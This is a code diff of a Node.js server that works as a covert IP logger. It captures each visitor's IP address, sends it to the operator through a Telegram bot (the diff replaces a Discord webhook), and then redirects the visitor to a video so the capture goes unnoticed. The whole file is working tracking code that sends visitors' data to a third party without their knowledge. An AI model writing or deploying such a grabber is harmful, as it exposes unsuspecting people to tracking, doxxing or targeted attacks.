@@ -1,6 +1,7 @@
 require('dotenv').config();
 const http = require('http');
 const https = require('https');
+const querystring = require('querystring');
 
 const ignoredIps = [
     '216.144.248.29', // Add more IPs here as needed
@@ -21,24 +22,26 @@ const getClientIp = (req) => {
     return req.socket.remoteAddress;
 };
 
-const sendToDiscordWebhook = (ip) => {
+const sendToTelegram = (ip) => {
     if (ignoredIps.includes(ip)) {
         return;
     }
 
-    const data = JSON.stringify({
-        content: `IP: ${ip}`
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const message = `IP: ${ip}`;
+
+    const data = querystring.stringify({
+        chat_id: chatId,
+        text: message
     });
 
-    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-    const url = new URL(webhookUrl);
-
     const options = {
-        hostname: url.hostname,
-        path: url.pathname,
+        hostname: 'api.telegram.org',
+        path: `/bot${token}/sendMessage`,
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': data.length
         }
     };
@@ -59,7 +62,7 @@ const sendToDiscordWebhook = (ip) => {
 
 const requestListener = (req, res) => {
     const clientIp = getClientIp(req);
-    sendToDiscordWebhook(clientIp);
+    sendToTelegram(clientIp);
 
     res.writeHead(302, { 'Location': 'https://b4sicallyf0x.com/up.mp4' });
     res.end();
